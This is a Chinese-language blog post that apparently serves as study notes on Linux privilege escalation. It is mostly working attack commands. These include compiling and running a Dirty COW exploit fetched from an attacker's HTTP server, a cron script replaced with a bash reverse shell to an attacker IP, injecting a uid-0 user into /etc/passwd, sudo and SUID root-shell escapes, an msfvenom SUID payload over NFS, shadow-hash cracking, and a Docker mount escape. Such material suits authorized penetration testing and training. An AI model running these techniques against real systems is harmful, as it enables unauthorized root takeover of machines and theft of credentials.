    <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>Linux提权方式的复习与学习。</p><span id="more"></span><h1 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h1><p>我们在 Linux 中特权升级的最终目标是获得root用户。</p><h1 id="内核漏洞提权"><a href="#内核漏洞提权" class="headerlink" title="内核漏洞提权"></a>内核漏洞提权</h1><p>通常我们在拥有一个webshell的时候，一般权限都是WEB容器权限，如在iis就是iis用户组权限，在apache就是apache权限，一般都是权限较低，均可执行一些普通命令，如查看当前用户，网络信息，ip信息等。如果我想进行内网渗透就必须将权限提权到最高，如系统权限超级管理员权限。</p><p>注意：没有在必要的情况下，不建议使用，因为会把目标机器搞的宕机</p><p>Linux利用内核漏洞一般包括三个环节：</p><ol><li>对目标系统进行信息收集，获取系统内核信息和版本信息。<br>查看发行版本:<br><code>cat /etc/issue</code><br><code>cat /etc/*-release</code><br><code>cat /etc/redhat-release</code><br><code>cat /proc/version</code><br>lsb_release -a</li></ol><p>查看内核版本信息:<br><code>uname -a</code></p><ol start="2"><li>获取EXP。<br>方法一：<br>利用Kali自带的searchsploit来搜索对应版本的exp：<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">searchsploit &lt;发行版本内核版本&gt;</span><br><span class="line">searchsploit -t Ubuntu 16.04 // -t 仅搜索漏洞标题</span><br><span class="line">searchsploit -s Ubuntu 16.04</span><br><span class="line">searchsploit -s Linux Kernel 4.15.0</span><br></pre></td></tr></table></figure></li></ol><p>方法二：<br>官网，或其它网站查找</p><ol start="3"><li>复制到当前目录，上传编译赋权执行。<br>找到可利用的脚本之后，查看路径信息，并复制一个到当前目录（别损坏了漏洞库中原文件）：<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">searchsploit -x linux/local/47169.c</span><br><span class="line"><span class="built_in">cp</span> /usr/share/exploitdb/exploits/linux/local/47169.c ./</span><br></pre></td></tr></table></figure></li></ol><p>如果有其它webshell，有上传权限，那就把这个脚本拿出来，上传上去，再执行就好。</p><p>如果没有其它上传途径，可以在攻击方本地开一个http服务，让目标来下载也行：（开的服务默认在根目录起始）</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">python3 -m http-server 80</span><br><span class="line">python -m SimpleHTTPServer 80</span><br></pre></td></tr></table></figure><p>之后将脚本放到根目录，然后让目标机来下载即可：<br><code>wget http://192.168.1.130/47196.c -O /tmp/47169.c</code><br>下载并保存到&#x2F;tmp目录下</p><p>编译，加权限，执行</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">gcc 47169.c -o exp</span><br><span class="line"><span class="built_in">chmod</span> +x exp</span><br><span class="line">./exp</span><br><span class="line"></span><br><span class="line">// <span class="built_in">id</span>测试是否提权成功</span><br><span class="line"><span class="built_in">id</span></span><br></pre></td></tr></table></figure><p><a href="https://github.com/The-Z-Labs/linux-exploit-suggester">Linux_Exploit_Suggester</a><br>很好用的一款提权辅助工具，用法很简单，在靶机上执行.&#x2F;linux-exploit-suggester.sh就会列出该靶机上可利用的漏洞编号.</p><h2 id="实例演示"><a href="#实例演示" class="headerlink" title="实例演示"></a>实例演示</h2><p>漏洞信息：CVE-2016-5195漏洞（Dirty COW，脏牛）<br>影响范围：Linux 内核2.6.22 – 3.9 (x86&#x2F;x64)<br>漏洞EXP：<a href="https://github.com/FireFart/dirtycow">https://github.com/FireFart/dirtycow</a><br>漏洞成因：<br>Linux写时拷贝技术（copy-on-write）<br>在Linux系统中，fork()会产生一个和父进程完全相同的子进程，但子进程在此后多会exec系统调用，出于效率考虑，Linux系统中引入了“写时复制”技术，也就是只有进程空间的各段的内容要发生变化时，才会将父进程的内容复制一份给子进程。</p><p>首先，搜索发行版本和内核版本，确认在Dirty Cow影响范围内。<br>利用 <code>serachsploit linux 3.2.78</code> 搜索该版本漏洞。<br>可以找到几个赃牛漏洞脚本，这里示例为40839.c脚本</p><p>将该脚本下载&#x2F;上传到目标机下。</p><p>然后编译该脚本：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">gcc -pthread 40839.c -o 40839 -lcrypt</span><br><span class="line"></span><br><span class="line">-pthread  在Linux中要用到多线程时，需要链接pthread库</span><br><span class="line">-o 40839  gcc生成的目标文件,名字为40839</span><br><span class="line">-lcrypt   添加需要的外部库</span><br></pre></td></tr></table></figure><p>添加可执行权限并执行：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">chmod +x ./dirty</span><br><span class="line">./dirty 999999</span><br></pre></td></tr></table></figure><p>之后就可以直接用密码999999登录root权限账户firefart</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">su firefart</span><br><span class="line">999999</span><br></pre></td></tr></table></figure><p>在运行漏洞利用后恢复 &#x2F;etc&#x2F;passwd<br><code>mv /tmp/passwd.bak /etc/passwd</code></p><h1 id="定时任务提权"><a href="#定时任务提权" class="headerlink" title="定时任务提权"></a>定时任务提权</h1><h2 id="前言-1"><a href="#前言-1" class="headerlink" title="前言"></a>前言</h2><p>定时任务(Cron job)是Linux系统中的一个守护进程，用于调度重复任务，通过控制crontab可以让系统周期性地执行某些命令或脚本。cron是Linux系统中最为实用的工具之一，但是也可能被黑客用于提权操作。由于cron通常以root特权运行，如果我们可以修改其调度的任何脚本或二进制文件，那么便可以使用root权限执行任意代码。<br>默认情况下，使用环境变量有限的&#x2F;bin&#x2F;shshell</p><p>Cron tables存储了Cron jobs的配置<br>User Crontabs通常位于&#x2F;var&#x2F;spool&#x2F;cron&#x2F;or&#x2F;var&#x2F;spool&#x2F;cron&#x2F;crontabs&#x2F;<br>system系统的crontab位于&#x2F;etc&#x2F;crontab</p><h2 id="实操"><a href="#实操" class="headerlink" title="实操"></a>实操</h2><ol><li><p>运用如下命令列出计划任务：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">ls</span> -l /etc/cron*</span><br><span class="line"><span class="built_in">cat</span> /etc/crontab</span><br></pre></td></tr></table></figure></li><li><p>在服务器上查找overwrite.sh 文件：<br><code>locate overwrite.sh</code><br><code>/usr/local/bin/overwrite.sh</code></p></li><li><p>检查文件的权限<br><code>ls -l /usr/local/bin/overwrite.sh</code><br>注意：这个文件是可写的</p></li><li><p>将 overwrite.sh文件的内容替换为：<br><code>#!/bin/bash bash -i &gt;&amp; /dev/tcp/192.168.175.130/4444 0&gt;&amp;1</code></p></li><li><p>kali上运行nc<br>等待 cron jobs运行，返回root权限</p></li><li><p>定时任务创建<br>编写一个脚本test.py ，将其权限置为所有用户可读可写可操作： <code>chmod 777 test.py</code></p></li></ol><p>而后修改crontab文件，将定时任务注册到系统中：<code>vim /etc/crontab</code><br>在末尾加上 <code>*/1 *   * * *   root    python  /home/ubuntu/test.py</code><br>表示每1分钟运行一次test.py。<br>至此，定时任务创建成功。</p><ol start="3"><li>提权操作<br>假设通过之前的渗透操作，获得了低权限的用户ubuntu。<br>查看crontab文件： <code>cat /etc/crontab</code><br>发现存在定时任务，以root身份定时运行 <code>/home/ubuntu/test.py</code><br>而test.py文件是任意成员可写的，于是向其代码尾部追加以下内容：<br><code>os.chmod(“/etc/passwd”,stat.S_IRWXU|stat.S_IRWXG|stat.S_IRWXO)</code><br>将passwd文件权限设置为任意成员可写。</li></ol><p>一分钟之后，程序自动运行，发现passwd已经任意成员可写。</p><p>接下来需要做的就是构造一个用户，在密码占位符处指定密码，UID设置为0，并将其添加到 &#x2F;etc&#x2F;passwd 文件中。</p><p>首先，使用perl语言生成带有盐值的密码：<br><code>perl -le &#39;print crypt(&quot;hack&quot;,&quot;addedsalt&quot;)&#39;</code></p><p>而后，拼接密码，将以下字符串写入&#x2F;etc&#x2F;passwd文件，之后便拥有了一个超级用户hack：hack。<br><code>hack:adCP9//qaScc2:0:0:User_like_root:/root:/bin/bash</code></p><p>最后，登录hack用户，自动跳转到root用户，提权成功！</p><h1 id="SUID提权"><a href="#SUID提权" class="headerlink" title="SUID提权"></a>SUID提权</h1><h2 id="简介-1"><a href="#简介-1" class="headerlink" title="简介"></a>简介</h2><p>SUID（Set UID, 设置用户ID）是赋予文件的一种权限，它会出现在文件拥有者权限的执行位上，具有这种权限的文件会在其执行时，使调用者暂时获得该文件拥有者的权限。为可执行文件添加suid权限的目的是简化操作流程，让普通用户也能做一些高权限才能做的的工作。但是如果某些现有的二进制文件和实用程序具有SUID权限的话，就可以在执行时将权限提升为root。</p><p>SUID提权的原理与Linux进程的UID有关，进程在运行的时候有以下三个UID：</p><p>（A）Real UID：执行该进程的用户的UID。Real UID只用于标识用户，不用于权限检查。</p><p>（B）Effective UID（EUID）：进程执行时生效的UID。在对访问目标进行操作时，系统会检查EUID是否有权限。一般情况下，Real UID与EUID相同，但在运行设置了SUID权限的程序时，进程的EUID会被设置为程序文件属主的UID。</p><p>（C）Saved UID：在高权限用户降权后，保留的UID。</p><p>如果某个设置了SUID权限的程序运行后创建了shell，那么shell进程的EUID也会是这个程序文件属主的UID，如果属主为root，便是一个root shell。root shell中运行的程序的EUID也都是0，具备超级权限，于是便实现了提权。</p><p>1、SUID权限仅对二进制程序(binary program)有效；<br>2、执行者对于该程序需要具有执行(x)的可执行权限；<br>3、本权限仅在执行该程序的过程中有效(run-time)；<br>4、执行者将具有该程序拥有者(owner)的权限。</p><p>SUID的目的就是：让本来没有相应权限的用户运行这个程序时，可以访问他没有权限访问的资源。</p><h2 id="SUID权限"><a href="#SUID权限" class="headerlink" title="SUID权限"></a>SUID权限</h2><p>通过以下命令，可找到具有SUID权限的参数：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">find / -perm -u=s -<span class="built_in">type</span> f 2&gt;/dev/null</span><br><span class="line">find / -user root -perm -4000-print2&gt;/dev/null</span><br><span class="line">find / -user root -perm -4000-<span class="built_in">exec</span> <span class="built_in">ls</span> -ldb &#123;&#125; \;</span><br><span class="line"></span><br><span class="line"><span class="comment"># 三选一</span></span><br><span class="line"><span class="comment"># /表示从文件系统的顶部（根）开始并找到每个目录</span></span><br><span class="line"><span class="comment"># -perm 表示搜索随后的权限</span></span><br><span class="line"><span class="comment"># -u = s表示查找root用户拥有的文件</span></span><br><span class="line"><span class="comment"># -type表示我们正在寻找的文件类型</span></span><br><span class="line"><span class="comment"># f 表示常规文件，而不是目录或特殊文件</span></span><br><span class="line"><span class="comment"># 2表示该进程的第二个文件描述符，即stderr（标准错误）</span></span><br></pre></td></tr></table></figure><p>SUID设置方法：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">chmod</span> u+s &lt;filename&gt;</span><br><span class="line"><span class="built_in">chmod</span> u-s &lt;filename&gt;</span><br></pre></td></tr></table></figure><p>常见SUID提权文件有：<br>nmap、vim、find、more、less、bash、cp、Nano、mv、awk、man、weget</p><ol><li>nmap<br>旧版本的 Nmap（2.02 到 5.21）具有交互模式，允许用户执行 shell 命令。由于 Nmap 位于以 root 权限执行的二进制文件列表中，因此可以使用交互式控制台来运行具有相同权限的 shell。</li></ol><p><code>nmap --interactive  # 启动交互模式</code></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">nmap&gt; !sh</span><br><span class="line">sh-3.2<span class="comment"># whoami</span></span><br><span class="line">root</span><br></pre></td></tr></table></figure><p>或者有一个 Metasploit 模块，它通过 SUID Nmap 二进制文件执行权限提升。<br><code>exploit/unix/local/setuid_nmap</code></p><ol start="2"><li>find<br>实用程序find可用于发现存储在系统上。然而，它是执行命令的能力。因此，如果它被配置为使用 SUID 权限运行，那么所有将通过 find 执行的命令都将以 root 身份执行。</li></ol><p>非root权限下：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">touch</span> abc</span><br><span class="line">find abc -<span class="built_in">exec</span> <span class="built_in">whoami</span> \;</span><br><span class="line"></span><br><span class="line"><span class="comment"># 或</span></span><br><span class="line"></span><br><span class="line">find . -<span class="built_in">exec</span> /bin/sh -p \; -quit <span class="comment"># 输入命令，返回shell</span></span><br></pre></td></tr></table></figure><ol start="3"><li>vim<br>Vim 的主要用途是作为文本编辑器。但是，如果它作为 SUID 运行，它将继承 root 用户的权限，因此它可以读取系统上的所有文件。</li></ol><p><code>vim.tiny /etc/shadow</code></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 还可以通过vim来打开shell</span></span><br><span class="line"></span><br><span class="line">vim.tiny</span><br><span class="line"></span><br><span class="line"><span class="comment"># Press ESC key</span></span><br><span class="line">:<span class="built_in">set</span> shell=/bin/sh</span><br><span class="line">:shell</span><br></pre></td></tr></table></figure><ol start="4"><li><p>bash</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">bash -p <span class="comment"># 进入bash命令交互模式</span></span><br><span class="line">bash-3.2<span class="comment"># id # 以root权限执行id</span></span><br><span class="line">uid=1002(service) gid=1002(service) euid=0(root) <span class="built_in">groups</span>=1002(service)<span class="comment"># 结果</span></span><br></pre></td></tr></table></figure></li><li><p>less &amp; more</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">less /etc/passwd</span><br><span class="line"></span><br><span class="line">!/bin/sh</span><br></pre></td></tr></table></figure></li><li><p>make</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">COMMAND=<span class="string">&#x27;/bin/sh -p&#x27;</span></span><br><span class="line">make -s -<span class="built_in">eval</span>=$<span class="string">&#x27;x:\n\t-&#x27;</span><span class="string">&quot;<span class="variable">$COMMAND</span>&quot;</span> <span class="comment"># 返回root shell</span></span><br></pre></td></tr></table></figure></li><li><p>flock</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flock -u / /bin/sh -p <span class="comment"># 返回root shell</span></span><br></pre></td></tr></table></figure></li><li><p>env</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">env</span> /bin/sh -p <span class="comment"># 返回root shell</span></span><br></pre></td></tr></table></figure></li><li><p>python</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -c <span class="string">&#x27;import os; os.execl(&quot;/bin/sh&quot;,&quot;sh&quot;,&quot;-p&quot;)&#x27;</span>  <span class="comment"># 返回root shell</span></span><br></pre></td></tr></table></figure></li></ol><h1 id="Sudo滥用提权"><a href="#Sudo滥用提权" class="headerlink" title="Sudo滥用提权"></a>Sudo滥用提权</h1><h2 id="简介-2"><a href="#简介-2" class="headerlink" title="简介"></a>简介</h2><p>sudo 是一个程序，允许用户运行具有其他用户安全特权的其他程序。</p><p>默认情况下，该其他用户将是root用户<br>用户通常需要输入密码才能使用sudo，并且必须允许用户通过&#x2F;etc&#x2F;sudoersfile文件中的规则访问。<br>规则可用于将用户限制在某些程序中，并放弃密码输入要求。<br>在一般用户需要取得特殊权限时，其可在命令前加上“sudo”，此时sudo将会询问该用户自己的密码（以确认终端机前的是该用户本人），回答后系统即会将该命令的进程以超级用户的权限运行。之后的一段时间内（默认为5分钟，可在&#x2F;etc&#x2F;sudoers自定义），使用sudo不需要再次输入密码。</p><h2 id="相关命令"><a href="#相关命令" class="headerlink" title="相关命令"></a>相关命令</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">sudo &lt;program&gt;  <span class="comment"># 使用sudo运行程序</span></span><br><span class="line">sudo -u &lt;username&gt; &lt;program&gt; <span class="comment"># 以特定用户的身份运行程序</span></span><br><span class="line">sudo -l <span class="comment"># 允许（且不允许）运行列出用户的程序</span></span><br><span class="line">sudo su <span class="comment"># 通过使用交换用户su命令生成root</span></span><br><span class="line">sudo -s sudo -i sudo /bin/bash sudo passwd <span class="comment"># </span></span><br></pre></td></tr></table></figure><p>在sudoers中增加以下内容，可以使用户user_test可以从任何终端运行，以root用户身份运行命令find 而无需密码。</p><p><code>user_test  ALL = (root) NOPASSWD: /usr/bin/find</code></p><p>可以利用sudo提权的命令如下：<br><code>wget、find、cat、apt、zip、xxd、time、taskset、git、sed、pip、ed、tmux、scp、perl、bash、less、awk、man、vi、env、ftp</code></p><h3 id="权限配置"><a href="#权限配置" class="headerlink" title="权限配置"></a>权限配置</h3><p>新建普通用户sudo_test，而后切换到root用户，执行以下动作：</p><p>添加文件的写权限： <code>chmod u+w /etc/sudoers</code></p><p>向sudoer文件中添加以下内容（可按需增加）：<br><code>sudo_test   ALL= (root) NOPASSWD: /usr/bin/find, (root) NOPASSWD: /usr/bin/vim,(root) NOPASSWD:/usr/bin/awk,(root) NOPASSWD:/usr/bin/man,(root) NOPASSWD:/usr/bin/less,(root) NOPASSWD:/bin/more,(root) NOPASSWD:/bin/tar,(root) NOPASSWD:/usr/bin/zip</code></p><p>撤销文件的写权限： <code>chmod u-w /etc/sudoers</code></p><h3 id="提权操作"><a href="#提权操作" class="headerlink" title="提权操作"></a>提权操作</h3><p>当前已经获取到低权限用户sudo_test，使用 <code>sudo -l</code> 命令查看本用户允许使用的sudo程序。</p><p><img src="/simg/Linux_Privilege_Escalation_2.png" alt=" "></p><ol><li><p>find</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo find /etc/passwd -<span class="built_in">exec</span> /bin/sh \ <span class="comment"># 返回root shell</span></span><br></pre></td></tr></table></figure></li><li><p>vim</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo vim -c <span class="string">&#x27;!sh&#x27;</span> <span class="comment"># 返回root shell</span></span><br></pre></td></tr></table></figure></li><li><p>awk</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo awk <span class="string">&#x27;BEGIN &#123;system(&quot;/bin/bash&quot;)&#125;&#x27;</span> <span class="comment"># 返回root shell</span></span><br></pre></td></tr></table></figure></li><li><p>less</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">sudo less /etc/hosts</span><br><span class="line">!</span><br><span class="line">(Enter) <span class="comment"># 返回root shell</span></span><br></pre></td></tr></table></figure></li><li><p>man</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">sudo man man</span><br><span class="line">!</span><br><span class="line">(enter) <span class="comment"># 返回root shell</span></span><br></pre></td></tr></table></figure></li></ol><h2 id="外壳逃生序列"><a href="#外壳逃生序列" class="headerlink" title="外壳逃生序列"></a>外壳逃生序列</h2><p>即使没有”明显”的方法来升级特权，我们也可以使用外壳逃生序列。</p><p>即使我们仅限于通过sudo运行某些程序，有时也有可能”逃避”程序并生成壳。<br>由于初始程序具有root权限运行，因此生成的外壳也是如此。<br>此处可以找到带有外壳逃生序列的程序列表：<a href="https://gtfobins.github.io/">https://gtfobins.github.io</a></p><h3 id="步骤"><a href="#步骤" class="headerlink" title="步骤"></a>步骤</h3><ol><li>列出允许用户运行的程序<br><code>sudo -l</code></li></ol><p><img src="/simg/Linux_Privilege_Escalation.png" alt=" "></p><ol start="2"><li><p>对每个程序进行查表，要细心<br><a href="https://gtfobins.github.io/">GTFObins</a></p></li><li><p>如果存在逃生序列，则通过sudo 运行程序并执行序列以生成根壳。</p></li></ol><h1 id="NFS提权"><a href="#NFS提权" class="headerlink" title="NFS提权"></a>NFS提权</h1><h2 id="简介-3"><a href="#简介-3" class="headerlink" title="简介"></a>简介</h2><p>NFS（网络文件系统）是一种分布式文件系统协议，NFS允许系统通过网络与其他人共享目录和文件。<br>在NFS文件共享中，用户甚至程序可以访问远程系统上的信息，就像它们驻留在本地计算机上一样。<br>NFS中的Root Squashing（root_sqaush）参数阻止对连接到NFS卷的远程root用户具有root访问权限。当该参数设置为no_root_squash时，登入 NFS 主机使用分享目录的使用者如果是 root 的话，那么对于这个分享的目录来说，他就具有 root 的权限，基于此原理便可实现提权。</p><p>NFS共享在&#x2F;etc&#x2F;exports文件中配置。<br>远程用户可以安装共享、访问、创建、修改文件。<br>默认情况下，创建的文件会继承remote用户的ID和组ID(分别作为所有者和组)，即使它们不存在 NFS 服务器上。</p><h2 id="相关命令-1"><a href="#相关命令-1" class="headerlink" title="相关命令"></a>相关命令</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">showmount -e &lt;target&gt; <span class="comment"># 显示NFS服务器的导出列表</span></span><br><span class="line">nmap -sV -script=nfs-showmount &lt;target&gt; <span class="comment"># 类似的nmap脚本</span></span><br><span class="line">mount -o rw,vers=2 &lt;target&gt;:&lt;share&gt; &lt;local_directory&gt; <span class="comment"># 安装NFS共享</span></span><br></pre></td></tr></table></figure><p><strong>Root Squashing</strong><br>Root Squashing是 NFS如何防止明显的特权升级。<br>如果远程用户是(或声称是)root(uid&#x3D;0)，NFS将改为”squash”用户，就好像他们是”nobody”用户一样，在”nogroup”组中。<br>虽然此行为是默认的，但它可以禁用！</p><p><strong>no_root_squash</strong><br>no_root_squash是一个 NFS 配置选项，它关闭root的squash。<br>当包含在可写入的共享配置中时，识别为”root”的远程用户可以作为本地根用户在 NFS 共享上创建文件。</p><h2 id="实操-1"><a href="#实操-1" class="headerlink" title="实操"></a>实操</h2><ol><li><p>检查 &#x2F;etc&#x2F;exports 的内容，了解具有no_root_squash选项的配置：<br><code>cat /etc/exports</code></p></li><li><p>确认NFS共享可用于远程安装：<br><code>showmount -e 192.168.1.25</code></p></li><li><p>在kali上创建一个文件夹，并安装&#x2F;tmp NFS共享：<br><code>mkdir /tmp/nfs mount -o rw,vers=2 192.168.175.228:/tmp /tmp/nfs</code></p></li><li><p>使用kali上的root用户生成有效载荷并将其保存到安装的共享中：<br><code>msfvenom -p linux/x86/exec CMD=&quot;/bin/bash -p&quot; -f elf -o /tmp/nfs/shell.elf</code></p></li><li><p>确保文件具有SUID集，并且每个用户都可执行：<br><code>chmod +xs /tmp/nfs/shell.elf</code></p></li><li><p>在目标机器上。执行文件以获取root：<br><code>/tmp/shell.elf bash-4.1</code></p></li></ol><h1 id="password-amp-key-提权"><a href="#password-amp-key-提权" class="headerlink" title="password &amp; key 提权"></a>password &amp; key 提权</h1><h2 id="简介-4"><a href="#简介-4" class="headerlink" title="简介"></a>简介</h2><ol><li>密码<br>虽然这看起来可能很漫长，但弱密码存储和密码重复使用可能是升级权限的简单方法。<br>虽然root用户的帐户密码被隐藏起来，并安全地存储在&#x2F;etc&#x2F;shadow中<br>但其他密码（如用于服务的密码）可能会 以普通文本存储在配置文件中。<br>如果根用户将密码重新用于服务，则可能会找到该密码并用于切换到根用户。</li></ol><p>大多数linux系统的密码都和&#x2F;etc&#x2F;passwd和&#x2F;etc&#x2F;shadow这两个配置文件息息相关。passwd里面储存了用户，shadow里面是密码的hash。出于安全考虑passwd是全用户可读，root可写的。shadow是仅root可读写的。<br>当我们的passwd和shadow一些权限配置不当就可能会导致提权</p><p><strong>passwd文件</strong><br><code>test:x:1000:1000::/home/test:/bin/bash</code><br>passwd 由冒号分割，第一列是用户名，第二列是密码，x 代表密码 hash 被放在 shadow 里面了（非root用户不可读）。<br>当我们的passwd文件给普通用户配置了写权限，那么我们就可以通过修改x为一段已知的密码的hash值来进行提权。</p><p><strong>shadow文件</strong><br><code>test:$6$Mqh9T8ip$4Ev.HJTBdyobrYaW/KzBlL0yx6wefeB.VDcE7KiDiwoUvGkqShU9jRK4cEZA2kBRsyH2fWjmbxc/ZyVWfXwFJ/:18849:0:99999:7:::</code><br>假如我们对shadow文件有读取权限我们就可以利用hash、john等对其进行爆破<br>这里以john为例进行演示，首先把passwd和shadow两文件放在同一文件下</p><p>然后进行破解<br><code>john --user=test test.hash</code></p><ol start="2"><li>历史文件<br>历史文件记录用户在使用某些程序时发出的命令。<br>如果用户将密码键入命令的一部分，此密码可能会存储在历史记录文件中。<br>尝试使用发现ed 密码切换到根</li></ol><h2 id="实操-2"><a href="#实操-2" class="headerlink" title="实操"></a>实操</h2><ol><li>查看用户&#x2F;home目录中隐藏文件的内容，文件名以“历史记录”结尾：<br><code>cat ~/.*history | less</code></li></ol><p>两次q退出来<br>似乎连接到MySQL服务器的用户<br><code>rootpassword123</code></p><ol start="2"><li>su登录<br><img src="/simg/Linux_Privilege_Escalation_3.png" alt=" "></li></ol><h1 id="Docker提权"><a href="#Docker提权" class="headerlink" title="Docker提权"></a>Docker提权</h1><p>除了利用Linux系统自带的工具进行提权，还可以利用大量存在风险的第三方工具进行提权，本文以Docker为例进行演示。 随着云化时代的来临，docker也越来越流行，在很多公司内部的linux机器上docker已然成了标配。Docker使用便捷，有以下几个特性：</p><p>（1）可免sudo使用docker：默认情况下使用docker必须要有sudo权限，对于一台机器多用户使用，往往很多用户只有普通权限。为了让普通用户也可以使用Docker，管理员将需要使用docker的用户添加到docker用户组(安装docker后默认会创建该组)中，用户重新登录机器即可免sudo使用docker了。</p><p>（2）容器内用户权限不受限：用户创建一个docker容器后，容器内默认是root账户，在不需要加sudo的情况下可以任意更改容器内的配置。正常情况下，这种模式既可以保证一台机器被很多普通用户使用，通过docker容器的隔离，相互之前互不影响；也给用户在容器内开放了充足的权限保证用户可以正常安装软件，修改容器配置等操作。</p><p>（3）容器内外文件可映射：docker提供了一个-v选项，提供用户将容器外的host目录映射进容器内，方便的进行容器内外的文件共享。</p><p>结合上面三个特点，可以实现用户提权操作。</p><ol><li><p>用户配置<br>使用管理员新建一个普通用户user_docker，并将其添加到docker组中：<br><code>sudo gpasswd -a user_docker docker</code></p></li><li><p>提权操作<br>通过前期的渗透操作，拿下user_docker的权限，下面对其进行提权。<br>首先，运行一个容器：<br><code>docker run -it -v /etc:/etc ubuntu /bin/bash</code><br>将宿主机的&#x2F;etc目录直接映射进容器，从而覆盖了容器内的&#x2F;etc目录。<br>由于linux系统上的本地用户信息主要记录在&#x2F;etc&#x2F;目录下，比如两个常见文件&#x2F;etc&#x2F;passwd和&#x2F;etc&#x2F;group，而在容器内当前用户有root权限，于是可以随意修改这两个文件，实现提权：</p></li></ol><p>修改&#x2F;etc&#x2F;passwd文件，可更改root密码，或者新增一个uid&#x3D;0的用户。</p><p>修改&#x2F;etc&#x2F;group文件，将当前用户添加到sudo组中。</p><p>本文演示第二种方法，在容器内执行下列命令：<br><code>usermod -aG sudo user_docker</code><br>将user_docker用户加载到sudo组中，而后退出容器。</p><p>查看宿主机文件&#x2F;etc&#x2F;group，可见user_docker已经拥有sudo权限，提权成功！</p><p>除此之外，DockerHub上已经有人将exp打包成镜像rootplease 。<br>只要用户在 docker 组中，运行下面命令就能直接在 docker 中获取到 root 权限:<br><code>docker run -v /:/hostOS -it chrisfosterelli/rootplease</code><br>容器生成后自动获取到宿主机的 root 权限，并启动 shell 程序，直接在 docker 中执行命令。</p><p>在这种多用户借助docker共用一台机器的情况下，普通用户可以借助docker提升为sudo用户，从而可以进行任意修改系统配置等各种恶意操作。<br>以上是本地用户的破坏还不是很明显，毕竟是公司内部用户大多不会进行恶意操作。然而，很多情况下普通用户为了方便，用户密码往往设置得很简单，如果攻击者通过其他途径暴力破解普通用户弱口令，就可以很轻松得提示为管理员从事不可限制的恶意操作，这也大大降低了攻击者的攻击难度。</p><h1 id="致谢"><a href="#致谢" class="headerlink" title="致谢"></a>致谢</h1><p><a href="https://blog.nsfocus.net/linux/">LINUX提权手法实践</a><br><a href="https://www.cnblogs.com/sfsec/p/15163907.html">Linux提权总结</a><br><a href="https://www.freebuf.com/articles/system/362070.html">Linux提权姿势总结</a><br><a 